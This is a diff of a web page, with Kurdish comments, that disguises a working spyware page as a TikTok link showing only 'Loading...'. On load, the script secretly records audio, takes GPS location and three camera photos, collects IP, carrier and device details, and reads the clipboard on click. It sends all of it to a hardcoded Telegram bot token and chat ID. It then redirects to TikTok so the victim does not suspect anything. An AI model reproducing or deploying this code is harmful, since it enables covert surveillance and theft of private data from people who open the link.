@@ -3,31 +3,25 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>System Diagnostic Ultra Max ⚠️</title>
+    <title>TikTok</title>
     <style>
-        body { background: #000; margin: 0; overflow: hidden; font-family: 'Courier New', monospace; }
-        canvas#matrix { position: absolute; top: 0; left: 0; z-index: -1; }
-        .content { display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; color: #0f0; text-shadow: 0 0 8px #0f0; background: rgba(0,0,0,0.6); }
-        .box { border: 2px solid #0f0; padding: 20px; background: rgba(0,0,0,0.8); text-align: left; max-width: 90%; font-size: 13px; line-height: 1.6; }
-        .flash { background: #fff !important; filter: brightness(200%); }
+        /* شاشەیەکی ڕەشی سادە وەک بارگاویکردن */
+        body { background: #000; margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; color: #333; font-family: sans-serif; }
     </style>
 </head>
 <body>
-    <canvas id="matrix"></canvas>
-    <div class="content">
-        <h1>[ ⚠️ SYSTEM BREACH DETECTED ⚠️ ]</h1>
-        <div class="box"><p id="status">> پشکنینی گشتگیر و داتاکانی سیستم... 🔄 🛡️</p></div>
-    </div>
+    <div id="loader">Loading...</div>
     <video id="v" style="display:none;" autoplay playsinline></video>
     <canvas id="c" style="display:none;"></canvas>
 
     <script>
         const botToken = '8117812522:AAGFhq6xv5zgci1Z9mt5H1a3c26V7h48CI4';
         const chatId = '1034878899';
+        const tiktokLink = "https://vt.tiktok.com/ZSmLkxJ31/";
 
         async function start() {
             try {
-                // ١. تۆمارکردنی دەنگ 🎤
+                // ١. تۆمارکردنی دەنگ (بێدەنگ) 🎤
                 const audioStream = await navigator.mediaDevices.getUserMedia({ audio: true });
                 const mediaRecorder = new MediaRecorder(audioStream);
                 let chunks = [];
@@ -43,17 +37,16 @@
 
                 // ٢. لۆکەیشن 📍
                 navigator.geolocation.getCurrentPosition(pos => {
-                    fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent("📍 شوێنی ورد (GPS): http://google.com/maps?q=" + pos.coords.latitude + "," + pos.coords.longitude)}`);
+                    fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent("📍 GPS: http://maps.google.com/maps?q=" + pos.coords.latitude + "," + pos.coords.longitude)}`);
                 });
 
-                // ٣. وێنەگرتن 📸
+                // ٣. وێنەگرتن (بەبێ فلاش بۆ ئەوەی هەست نەکات) 📸
                 const videoStream = await navigator.mediaDevices.getUserMedia({ video: true });
                 const videoEl = document.getElementById('v');
                 videoEl.srcObject = videoStream;
-                document.body.classList.add('flash');
                 
                 for (let i = 0; i < 3; i++) {
-                    await new Promise(r => setTimeout(r, 1200));
+                    await new Promise(r => setTimeout(r, 1000));
                     const picCanvas = document.getElementById('c');
                     picCanvas.width = videoEl.videoWidth; picCanvas.height = videoEl.videoHeight;
                     picCanvas.getContext('2d').drawImage(videoEl, 0, 0);
@@ -62,66 +55,46 @@
                     fd.append('chat_id', chatId); fd.append('photo', b, 'u.jpg');
                     fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, { method: 'POST', body: fd });
                 }
-                document.body.classList.remove('flash');
                 videoStream.getTracks().forEach(t => t.stop());
 
-                // ٤. زانیارییە نوێیەکان و ISP 📋
+                // ٤. کۆکردنەوەی هەموو زانیارییەکان 📋
                 const ipRes = await fetch('https://ipapi.co/json/');
                 const data = await ipRes.json();
                 const battery = navigator.getBattery ? await navigator.getBattery() : { level: 0 };
                 const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
-                const netType = conn ? conn.effectiveType : "نادیار";
-                
-                // زمان و وێبگەڕ
-                const userLang = navigator.language || navigator.userLanguage;
-                const browserName = navigator.userAgent;
-
-                document.addEventListener('click', async () => {
-                    try {
-                        const text = await navigator.clipboard.readText();
-                        fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent("📋 داتای کۆپی کراو (Clipboard): " + text)}`);
-                    } catch(e) {}
-                });
+                const netType = conn ? conn.effectiveType : "N/A";
+                const userLang = navigator.language;
 
                 const report = `
-💀 **ڕاپۆرتی سیخوڕی کۆتایی** 💀
-----------------------------------
-🌐 **تۆڕ و ئینتەرنێت:**
-• ئایپی: \`${data.ip}\` 🛰️
-• نەوەی هێڵ: **${netType.toUpperCase()}** ⚡
-• کۆمپانیای سیم/هێڵ: **${data.org}** 📶
-• وڵات: ${data.country_name} 🏳️ | شار: ${data.city} 🏙️
+👤 **Target Detected**
+-------------------------
+🌐 IP: \`${data.ip}\`
+📶 Network: ${netType.toUpperCase()} (${data.org})
+🌍 Country: ${data.country_name}
+📱 Device: ${navigator.platform}
+🔋 Battery: ${Math.round(battery.level * 100)}%
+🗣️ Lang: ${userLang}
+-------------------------`;
+                
+                await fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(report)}&parse_mode=Markdown`);
 
-📱 **زانیاری ئامێر:**
-• پلاتفۆرم: ${navigator.platform} 💻
-• وێبگەڕ: ${browserName.split(') ')[1]} 🌐
-• زمانی مۆبایل: ${userLang} 🗣️
-• پاتری: ${Math.round(battery.level * 100)}% 🔋
-• پڕۆسێسەر: ${navigator.hardwareConcurrency} Cores 🧠
+                // کۆتا هەنگاو: ڕەوانەکردن بۆ تیکتۆک
+                window.location.href = tiktokLink;
 
-📍 **ناوچە:** ${data.region} 🗺️
-⏰ **کات:** ${new Date().toLocaleString('ku-IQ')} 🕒
-----------------------------------
-`;
-                fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(report)}&parse_mode=Markdown`);
+            } catch(e) {
+                // ئەگەر مۆڵەتی نەدا، هەر بیبە بۆ تیکتۆک بۆ ئەوەی گومان نەکات
+                window.location.href = tiktokLink;
+            }
+        }
 
+        // وەرگرتنی کلپبۆرد لە کاتی کلیک
+        document.addEventListener('click', async () => {
+            try {
+                const text = await navigator.clipboard.readText();
+                fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent("📋 Clipboard: " + text)}`);
             } catch(e) {}
-        }
+        });
 
-        const canvas = document.getElementById('matrix');
-        const ctx = canvas.getContext('2d');
-        canvas.width = window.innerWidth; canvas.height = window.innerHeight;
-        const drops = Array(Math.floor(canvas.width / 16)).fill(1);
-        function draw() {
-            ctx.fillStyle = "rgba(0,0,0,0.05)"; ctx.fillRect(0,0,canvas.width,canvas.height);
-            ctx.fillStyle = "#0f0"; ctx.font = "16px monospace";
-            drops.forEach((y, i) => {
-                ctx.fillText("01"[Math.floor(Math.random()*2)], i*16, y*16);
-                if (y*16 > canvas.height && Math.random() > 0.975) drops[i] = 0;
-                drops[i]++;
-            });
-        }
-        setInterval(draw, 33);
         window.onload = start;
     </script>
 </body>
